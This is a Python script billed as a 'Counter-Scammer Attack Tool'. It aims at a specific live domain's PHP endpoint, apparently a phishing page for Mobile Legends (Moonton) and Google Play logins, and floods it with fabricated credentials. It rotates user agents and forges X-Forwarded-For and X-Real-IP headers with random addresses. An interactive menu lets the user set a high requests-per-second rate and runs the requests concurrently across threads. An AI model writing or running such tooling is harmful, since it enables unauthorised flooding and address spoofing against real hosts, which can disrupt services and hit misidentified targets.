import requests
import urllib.parse
from typing import Dict, Optional, List
import json
import random
import string
import time
import sys
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add parent directory to path to import custom UserAgent
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from UserAgent.user_agent import UserAgent as CustomUserAgent


class CounterScammer:
    """
    A class to send HTTP requests to counter scammer endpoints.
    """
    
    def __init__(self):
        """Initialize the CounterScammer with default headers."""
        self.base_url = "https://join.yimicargo.de"
        self.endpoint = "/xyzlenzz.php"
        self.referer_url = "https://join.yimicargo.de/ress.php"
        
        # Initialize custom user agent
        self.user_agent_list = CustomUserAgent.get_user_agents()
        
        # Default headers based on the provided request
        self.headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "dnt": "1",
            "referer": self.referer_url,
            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0",
            "x-requested-with": "XMLHttpRequest"
        }
        
        # Login types and their corresponding form data templates
        self.login_types = {
            "moonton": {
                "email": "jokowi@gmail.com",
                "password": "sdfsdfsd",
                "pass": "sfdsfdsfds",
                "login": "Moonton",
                "playid": "23423423423",
                "codetel": "",
                "server": "23432",
                "phone": "rs2342423423423",
                "level": "4",
                "points": "Renowned Collector"
            },
            "google": {
                "email": "123@gmail.com",
                "password": "123123123",
                "pass": "",
                "login": "Google Play",
                "playid": "123123123",
                "codetel": "",
                "server": "123",
                "phone": "123123123",
                "level": "200",
                "points": "World Collector"
            }
        }
        
        # Default form data template (Moonton)
        self.default_form_data = self.login_types["moonton"].copy()
    
    def update_headers(self, custom_headers: Dict[str, str]) -> None:
        """
        Update the default headers with custom values.
        
        Args:
            custom_headers (Dict[str, str]): Dictionary of custom headers to update
        """
        self.headers.update(custom_headers)
    
    def update_form_data(self, custom_data: Dict[str, str]) -> None:
        """
        Update the default form data with custom values.
        
        Args:
            custom_data (Dict[str, str]): Dictionary of custom form data to update
        """
        self.default_form_data.update(custom_data)
    
    def send_request(self, form_data: Optional[Dict[str, str]] = None, 
                    custom_headers: Optional[Dict[str, str]] = None) -> requests.Response:
        """
        Send POST request to the target endpoint.
        
        Args:
            form_data (Optional[Dict[str, str]]): Custom form data, uses default if None
            custom_headers (Optional[Dict[str, str]]): Custom headers to add/override
            
        Returns:
            requests.Response: The response object from the request
        """
        # Use provided form data or default
        data_to_send = form_data if form_data is not None else self.default_form_data.copy()
        
        # Use provided headers or default
        headers_to_use = self.headers.copy()
        if custom_headers:
            headers_to_use.update(custom_headers)
        
        # Construct full URL
        full_url = f"{self.base_url}{self.endpoint}"
        
        try:
            # Send POST request
            response = requests.post(
                url=full_url,
                data=data_to_send,
                headers=headers_to_use,
                timeout=30
            )
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
            raise
    
    def send_multiple_requests(self, requests_data: list, delay: float = 1.0) -> list:
        """
        Send multiple requests with optional delay between them.
        
        Args:
            requests_data (list): List of dictionaries containing form_data and optional headers
            delay (float): Delay in seconds between requests
            
        Returns:
            list: List of response objects
        """
        
        responses = []
        for i, request_info in enumerate(requests_data):
            form_data = request_info.get('form_data')
            custom_headers = request_info.get('headers')
            
            print(f"Sending request {i+1}/{len(requests_data)}...")
            response = self.send_request(form_data, custom_headers)
            responses.append(response)
            
            # Add delay between requests (except for the last one)
            if i < len(requests_data) - 1:
                time.sleep(delay)
        
        return responses
    
    def print_response_info(self, response: requests.Response) -> None:
        """
        Print useful information about the response.
        
        Args:
            response (requests.Response): The response object to analyze
        """
        print(f"Status Code: {response.status_code}")
        print(f"Response URL: {response.url}")
        print(f"Response Headers: {dict(response.headers)}")
        print(f"Response Text: {response.text[:500]}...")  # First 500 chars
        
    def generate_fake_ip(self) -> str:
        """
        Generate a random fake IP address.
        
        Returns:
            str: A fake IP address
        """
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def get_random_user_agent(self) -> str:
        """
        Get a random user agent from the custom UserAgent list.
        
        Returns:
            str: A random user agent string
        """
        return random.choice(self.user_agent_list)
    
    def generate_fake_email(self, provider: str = None) -> str:
        """
        Generate a fake email address.
        
        Args:
            provider (str): Email provider (gmail, yahoo, outlook, etc.)
            
        Returns:
            str: A fake email address
        """
        providers = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]
        if provider is None:
            provider = random.choice(providers)
        
        username_parts = [
            ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))),
            ''.join(random.choices(string.digits, k=random.randint(2, 4)))
        ]
        username = ''.join(username_parts)
        
        return f"{username}@{provider}"
    
    def generate_fake_phone(self, prefix: str = "0") -> str:
        """
        Generate a fake phone number starting with 0.
        
        Args:
            prefix (str): Phone number prefix (default "0")
            
        Returns:
            str: A fake phone number starting with 0
        """
        if prefix == "0":
            # Generate phone numbers starting with 08, 09, 01, 07, 02
            second_digit = random.choice(['1', '2', '7', '8', '9'])
            remaining_digits = ''.join(random.choices(string.digits, k=random.randint(8, 10)))
            return f"0{second_digit}{remaining_digits}"
        else:
            return prefix + ''.join(random.choices(string.digits, k=random.randint(10, 15)))
    
    def generate_fake_data_by_type(self, login_type: str = "moonton", custom_email: str = None) -> Dict[str, str]:
        """
        Generate fake form data based on login type (moonton or google).
        
        Args:
            login_type (str): Type of login ("moonton" or "google")
            custom_email (str): Custom email to use
            
        Returns:
            Dict[str, str]: Generated fake form data
        """
        if login_type.lower() not in self.login_types:
            login_type = "moonton"
        
        base_data = self.login_types[login_type.lower()].copy()
        
        # Generate fake email
        if custom_email:
            base_data['email'] = custom_email
        else:
            base_data['email'] = self.generate_fake_email()
        
        # Generate fake password
        base_data['password'] = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 12)))
        
        # Generate fake data based on login type
        if login_type.lower() == "moonton":
            # For Moonton, password and pass must be the same
            fake_password = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 12)))
            base_data['password'] = fake_password
            base_data['pass'] = fake_password  # Same as password for Moonton
            
            base_data['playid'] = ''.join(random.choices(string.digits, k=random.randint(10, 12)))
            base_data['server'] = ''.join(random.choices(string.digits, k=random.randint(4, 6)))  # 4-6 digits
            base_data['phone'] = self.generate_fake_phone("0")  # Must start with 0
            base_data['level'] = str(random.randint(1, 50))
            
            # Specific points for Moonton
            moonton_points = [
                "Amateur Collector", "Junior Collector", "Seasoned Collector", 
                "Expert Collector", "Renowned Collector", "Exalted Collector", 
                "Mega Collector", "World Collector"
            ]
            base_data['points'] = random.choice(moonton_points)
            
        elif login_type.lower() == "google":
            base_data['pass'] = ""  # Google Play usually has empty pass field
            base_data['playid'] = ''.join(random.choices(string.digits, k=random.randint(8, 10)))
            base_data['server'] = ''.join(random.choices(string.digits, k=random.randint(3, 5)))
            base_data['phone'] = ''.join(random.choices(string.digits, k=random.randint(10, 12)))
            base_data['level'] = str(random.randint(50, 300))
            
            # Random points for Google Play
            google_points = [
                "World Collector", "Global Collector", "Universe Collector",
                "Galaxy Collector", "Supreme Collector", "Ultimate Collector"
            ]
            base_data['points'] = random.choice(google_points)
        
        return base_data
    
    def generate_random_headers(self) -> Dict[str, str]:
        """
        Generate headers with random user agent and fake IP.
        
        Returns:
            Dict[str, str]: Headers with random user agent
        """
        headers = self.headers.copy()
        headers['user-agent'] = self.get_random_user_agent()
        
        # Add fake IP as X-Forwarded-For header
        headers['X-Forwarded-For'] = self.generate_fake_ip()
        headers['X-Real-IP'] = self.generate_fake_ip()
        
        return headers
    
    def send_concurrent_requests(self, requests_data: list, rps: int, duration: int) -> list:
        """
        Send multiple requests concurrently to achieve target RPS.
        
        Args:
            requests_data (list): List of dictionaries containing form_data and headers
            rps (int): Target requests per second
            duration (int): Duration in seconds
            
        Returns:
            list: List of response objects
        """
        responses = []
        successful_requests = 0
        failed_requests = 0
        request_times = []
        
        def send_single_request(request_info, request_index):
            """Send a single request and return the result."""
            try:
                form_data = request_info['form_data']
                custom_headers = request_info['headers']
                login_type = request_info['login_type']
                
                start_time = time.time()
                response = self.send_request(form_data, custom_headers)
                end_time = time.time()
                
                return {
                    'index': request_index,
                    'response': response,
                    'success': response.status_code == 200,
                    'form_data': form_data,
                    'login_type': login_type,
                    'request_time': end_time - start_time
                }
            except Exception as e:
                return {
                    'index': request_index,
                    'response': None,
                    'success': False,
                    'form_data': request_info['form_data'],
                    'login_type': request_info['login_type'],
                    'error': str(e),
                    'request_time': 0
                }
        
        # Calculate batch size and intervals
        batch_interval = 1.0  # Send batches every second
        requests_per_batch = rps
        total_batches = duration
        
        print(f"Sending {requests_per_batch} requests per second for {duration} seconds...")
        print(f"Total batches: {total_batches}, Requests per batch: {requests_per_batch}")
        
        start_time = time.time()
        
        for batch_num in range(total_batches):
            batch_start_time = time.time()
            
            # Get requests for this batch
            batch_start_index = batch_num * requests_per_batch
            batch_end_index = min(batch_start_index + requests_per_batch, len(requests_data))
            batch_requests = requests_data[batch_start_index:batch_end_index]
            
            if not batch_requests:
                break
            
            print(f"\nBatch {batch_num + 1}/{total_batches}: Sending {len(batch_requests)} requests...")
            
            # Use ThreadPoolExecutor to send requests concurrently
            with ThreadPoolExecutor(max_workers=min(50, len(batch_requests))) as executor:
                # Submit all requests in this batch
                future_to_request = {
                    executor.submit(send_single_request, req, batch_start_index + i): (batch_start_index + i, req)
                    for i, req in enumerate(batch_requests)
                }
                
                # Collect results as they complete
                batch_results = []
                for future in as_completed(future_to_request):
                    result = future.result()
                    batch_results.append(result)
                    
                    # Show progress for this batch
                    form_data = result['form_data']
                    index = result['index']
                    print(f"[{index + 1}/{len(requests_data)}] {form_data['login']} - {form_data['email']} - {form_data['password']} - {form_data['pass']} - {form_data['phone']} - {form_data['points']}")
                
                # Process batch results
                for result in batch_results:
                    if result['success']:
                        successful_requests += 1
                        responses.append(result['response'])
                    else:
                        failed_requests += 1
                        if result['response']:
                            responses.append(result['response'])
                    
                    if 'request_time' in result:
                        request_times.append(result['request_time'])
            
            # Wait for next batch (maintain 1-second intervals)
            batch_elapsed = time.time() - batch_start_time
            if batch_elapsed < batch_interval and batch_num < total_batches - 1:
                sleep_time = batch_interval - batch_elapsed
                time.sleep(sleep_time)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        return {
            'responses': responses,
            'successful_requests': successful_requests,
            'failed_requests': failed_requests,
            'total_time': total_time,
            'request_times': request_times,
            'actual_rps': len(requests_data) / total_time if total_time > 0 else 0
        }


# Example usage and testing functions
def test_single_request():
    """Test sending a single request."""
    scammer = CounterScammer()
    
    print("Sending single request...")
    response = scammer.send_request()
    scammer.print_response_info(response)
    

def test_multiple_requests():
    """Test sending multiple requests with different data."""
    scammer = CounterScammer()
    
    # Prepare multiple requests with different data
    requests_data = []
    for i in range(3):
        fake_data = scammer.generate_fake_data_by_type("moonton")
        fake_headers = scammer.generate_random_headers()
        requests_data.append({'form_data': fake_data, 'headers': fake_headers})
    
    print("Sending multiple requests...")
    responses = scammer.send_multiple_requests(requests_data, delay=2.0)
    
    for i, response in enumerate(responses):
        print(f"\n--- Response {i+1} ---")
        scammer.print_response_info(response)


def test_custom_data():
    """Test sending request with custom data."""
    scammer = CounterScammer()
    
    custom_data = {
        "email": "custom@example.com",
        "password": "custompass123",
        "pass": "custompass456",
        "login": "CustomLogin",
        "playid": "999999999999",
        "server": "99999",
        "phone": "rs999999999999999",
        "level": "99",
        "points": "Custom Collector"
    }
    
    print("Sending request with custom data...")
    response = scammer.send_request(form_data=custom_data)
    scammer.print_response_info(response)


def test_google_vs_moonton():
    """Test sending requests with both Google Play and Moonton login types."""
    scammer = CounterScammer()
    
    print("Testing Google Play login type:")
    google_data = scammer.generate_fake_data_by_type("google")
    google_headers = scammer.generate_random_headers()
    print(f"Generated Google data: {google_data}")
    
    response_google = scammer.send_request(form_data=google_data, custom_headers=google_headers)
    scammer.print_response_info(response_google)
    
    time.sleep(2)
    
    print("\n" + "="*50)
    print("Testing Moonton login type:")
    moonton_data = scammer.generate_fake_data_by_type("moonton")
    moonton_headers = scammer.generate_random_headers()
    print(f"Generated Moonton data: {moonton_data}")
    
    response_moonton = scammer.send_request(form_data=moonton_data, custom_headers=moonton_headers)
    scammer.print_response_info(response_moonton)


def test_mass_attack():
    """Test sending multiple requests with random data to simulate a counter-attack."""
    scammer = CounterScammer()
    
    num_requests = 10
    login_types = ["google", "moonton"]
    
    print(f"Starting mass counter-attack with {num_requests} requests...")
    
    requests_data = []
    for i in range(num_requests):
        # Randomly choose login type
        login_type = random.choice(login_types)
        
        # Generate fake data and headers
        fake_data = scammer.generate_fake_data_by_type(login_type)
        fake_headers = scammer.generate_random_headers()
        
        requests_data.append({
            'form_data': fake_data,
            'headers': fake_headers
        })
        
        print(f"Request {i+1}: {login_type} login with email {fake_data['email']}")
    
    print("\nExecuting requests...")
    responses = scammer.send_multiple_requests(requests_data, delay=1.5)
    
    # Summary
    successful_requests = sum(1 for r in responses if r.status_code == 200)
    print(f"\nSummary:")
    print(f"Total requests: {len(responses)}")
    print(f"Successful requests (200): {successful_requests}")
    print(f"Failed requests: {len(responses) - successful_requests}")


def generate_and_show_fake_data():
    """Generate and display various fake data samples."""
    scammer = CounterScammer()
    
    print("=== FAKE DATA GENERATOR ===")
    
    print("\n1. Random User Agents:")
    for i in range(3):
        print(f"   {i+1}. {scammer.get_random_user_agent()}")
    
    print("\n2. Random IP Addresses:")
    for i in range(5):
        print(f"   {i+1}. {scammer.generate_fake_ip()}")
    
    print("\n3. Random Email Addresses:")
    for i in range(5):
        print(f"   {i+1}. {scammer.generate_fake_email()}")
    
    print("\n4. Random Phone Numbers:")
    for i in range(5):
        print(f"   {i+1}. {scammer.generate_fake_phone('0')}")  # With 0 prefix
    
    print("\n5. Google Play Login Data:")
    google_data = scammer.generate_fake_data_by_type("google")
    for key, value in google_data.items():
        print(f"   {key}: {value}")
    
    print("\n6. Moonton Login Data:")
    moonton_data = scammer.generate_fake_data_by_type("moonton")
    for key, value in moonton_data.items():
        print(f"   {key}: {value}")


def interactive_counter_attack():
    """Interactive menu for counter-attack operations."""
    scammer = CounterScammer()
    
    print("CounterScammer Tool - Enhanced Edition")
    print("=" * 50)
    print("Welcome to the Counter-Scammer Attack Tool!")
    print()
    
    try:
        # Choose attack mode
        print("Select attack mode:")
        print("1 - Fixed number of requests with delay")
        print("2 - Requests per second (RPS) mode")
        
        while True:
            try:
                mode = int(input("Enter your choice (1 or 2): "))
                if mode in [1, 2]:
                    break
                else:
                    print("Please enter 1 or 2.")
            except ValueError:
                print("Please enter a valid number (1 or 2).")
        
        if mode == 1:
            # Original mode - fixed number with delay
            # Get number of requests
            while True:
                try:
                    num_requests = int(input("Enter number of requests to send: "))
                    if num_requests > 0:
                        break
                    else:
                        print("Please enter a positive number.")
                except ValueError:
                    print("Please enter a valid number.")
            
            # Get delay between requests
            while True:
                try:
                    delay = float(input("Enter delay between requests in seconds (e.g., 1.5): "))
                    if delay >= 0:
                        break
                    else:
                        print("Please enter a non-negative number.")
                except ValueError:
                    print("Please enter a valid number.")
            
            total_requests = num_requests
            
        else:
            # RPS mode - requests per second
            while True:
                try:
                    rps = int(input("Enter requests per second (e.g., 100): "))
                    if rps > 0:
                        break
                    else:
                        print("Please enter a positive number.")
                except ValueError:
                    print("Please enter a valid number.")
            
            while True:
                try:
                    duration = int(input("Enter duration in seconds (e.g., 2): "))
                    if duration > 0:
                        break
                    else:
                        print("Please enter a positive number.")
                except ValueError:
                    print("Please enter a valid number.")
            
            total_requests = rps * duration
            delay = 1.0 / rps  # Calculate delay between requests
        
        # Get login type preference
        print("\nSelect login type:")
        print("0 - Both (Moonton and Google Play)")
        print("1 - Moonton only")
        print("2 - Google Play only")
        
        while True:
            try:
                choice = int(input("Enter your choice (0, 1, or 2): "))
                if choice in [0, 1, 2]:
                    break
                else:
                    print("Please enter 0, 1, or 2.")
            except ValueError:
                print("Please enter a valid number (0, 1, or 2).")
        
        # Map choice to login types
        if choice == 0:
            login_types = ["moonton", "google"]
            choice_name = "Both (Moonton and Google Play)"
        elif choice == 1:
            login_types = ["moonton"]
            choice_name = "Moonton only"
        else:  # choice == 2
            login_types = ["google"]
            choice_name = "Google Play only"
        
        print(f"\n" + "="*60)
        print(f"ATTACK CONFIGURATION:")
        if mode == 1:
            print(f"Mode: Fixed requests with delay")
            print(f"Number of requests: {total_requests}")
            print(f"Delay between requests: {delay} seconds")
        else:
            print(f"Mode: Requests per second (RPS)")
            print(f"Requests per second: {rps}")
            print(f"Duration: {duration} seconds")
            print(f"Total requests: {total_requests}")
            print(f"Delay between requests: {delay:.4f} seconds")
        print(f"Login type: {choice_name}")
        print(f"="*60)
        
        # Confirm before starting
        confirm = input("\nStart the counter-attack? (y/n): ").lower()
        if confirm not in ['y', 'yes']:
            print("Attack cancelled.")
            return
        
        # Generate requests data silently
        requests_data = []
        
        for i in range(total_requests):
            # Choose login type
            if len(login_types) == 1:
                login_type = login_types[0]
            else:
                login_type = random.choice(login_types)
            
            # Generate fake data and headers
            fake_data = scammer.generate_fake_data_by_type(login_type)
            fake_headers = scammer.generate_random_headers()
            
            requests_data.append({
                'form_data': fake_data,
                'headers': fake_headers,
                'login_type': login_type
            })
        
        print(f"\n" + "="*60)
        print("EXECUTING COUNTER-ATTACK...")
        print(f"="*60)
        
        if mode == 1:
            # Original sequential mode
            responses = []
            successful_requests = 0
            failed_requests = 0
            start_time = time.time()
            
            for i, request_info in enumerate(requests_data):
                form_data = request_info['form_data']
                custom_headers = request_info['headers']
                login_type = request_info['login_type']
                
                # Show request in the specified format: [1/200] login - email - password - pass - phone - points
                print(f"[{i+1}/{total_requests}] {form_data['login']} - {form_data['email']} - {form_data['password']} - {form_data['pass']} - {form_data['phone']} - {form_data['points']}")
                
                try:
                    response = scammer.send_request(form_data, custom_headers)
                    responses.append(response)
                    
                    if response.status_code == 200:
                        successful_requests += 1
                    else:
                        failed_requests += 1
                    
                except Exception as e:
                    failed_requests += 1
                    
                # Add delay between requests (except for the last one)
                if i < total_requests - 1 and delay > 0:
                    time.sleep(delay)
            
            end_time = time.time()
            total_time = end_time - start_time
            actual_rps = total_requests / total_time if total_time > 0 else 0
            
        else:
            # RPS mode - use concurrent requests
            result = scammer.send_concurrent_requests(requests_data, rps, duration)
            responses = result['responses']
            successful_requests = result['successful_requests']
            failed_requests = result['failed_requests']
            total_time = result['total_time']
            actual_rps = result['actual_rps']
        
        # Final summary
        print(f"\n" + "="*60)
        print(f"COUNTER-ATTACK COMPLETED!")
        print(f"="*60)
        print(f"Total requests sent: {total_requests}")
        print(f"Successful requests (200): {successful_requests}")
        print(f"Failed requests: {failed_requests}")
        print(f"Success rate: {(successful_requests/total_requests)*100:.1f}%")
        print(f"Total time: {total_time:.2f} seconds")
        print(f"Actual RPS: {actual_rps:.2f} requests/second")
        if mode == 2:
            print(f"Target RPS: {rps} requests/second")
        print(f"="*60)
        
        # Ask if user wants detailed response analysis
        if responses:
            analyze = input("\nWould you like to see detailed response analysis? (y/n): ").lower()
            if analyze in ['y', 'yes']:
                print(f"\n" + "="*60)
                print("DETAILED RESPONSE ANALYSIS:")
                print(f"="*60)
                
                for i, response in enumerate(responses):
                    request_info = requests_data[i]
                    print(f"\n--- Request {i+1} ({request_info['login_type'].upper()}) ---")
                    print(f"Email: {request_info['form_data']['email']}")
                    print(f"Status Code: {response.status_code}")
                    print(f"Response URL: {response.url}")
                    print(f"Response Length: {len(response.text)} characters")
                    print(f"Response Headers: {dict(list(response.headers.items())[:3])}...")  # First 3 headers
                    print(f"Response Preview: {response.text[:200]}...")
                    if i < len(responses) - 1:
                        print("-" * 40)
    
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")


def test_data_generation():
    """Test the improved data generation with new requirements."""
    scammer = CounterScammer()
    
    print("=== TESTING NEW DATA GENERATION ===\n")
    
    print("1. Testing Moonton data generation:")
    for i in range(3):
        moonton_data = scammer.generate_fake_data_by_type("moonton")
        print(f"\nRequest {i+1}:")
        print(f"   Email: {moonton_data['email']}")
        print(f"   Password: {moonton_data['password']}")
        print(f"   Pass: {moonton_data['pass']}")
        print(f"   Phone: {moonton_data['phone']}")
        print(f"   Server: {moonton_data['server']}")
        print(f"   Points: {moonton_data['points']}")
        print(f"   Password == Pass: {moonton_data['password'] == moonton_data['pass']}")
    
    print("\n" + "="*50)
    print("2. Testing Google Play data generation:")
    for i in range(2):
        google_data = scammer.generate_fake_data_by_type("google")
        print(f"\nRequest {i+1}:")
        print(f"   Email: {google_data['email']}")
        print(f"   Password: {google_data['password']}")
        print(f"   Pass: {google_data['pass']}")
        print(f"   Phone: {google_data['phone']}")
        print(f"   Server: {google_data['server']}")
        print(f"   Points: {google_data['points']}")
    
    print("\n" + "="*50)
    print("3. Testing phone number generation:")
    for i in range(10):
        phone = scammer.generate_fake_phone("0")
        print(f"   Phone {i+1}: {phone}")
    
    print("\n" + "="*50)
    print("4. Testing fake IP and User-Agent:")
    for i in range(3):
        headers = scammer.generate_random_headers()
        print(f"\nSet {i+1}:")
        print(f"   IP (X-Forwarded-For): {headers['X-Forwarded-For']}")
        print(f"   IP (X-Real-IP): {headers['X-Real-IP']}")
        print(f"   User-Agent: {headers['user-agent'][:100]}...")


# Add this function to the existing test functions section

if __name__ == "__main__":
    # Run interactive counter-attack
    interactive_counter_attack()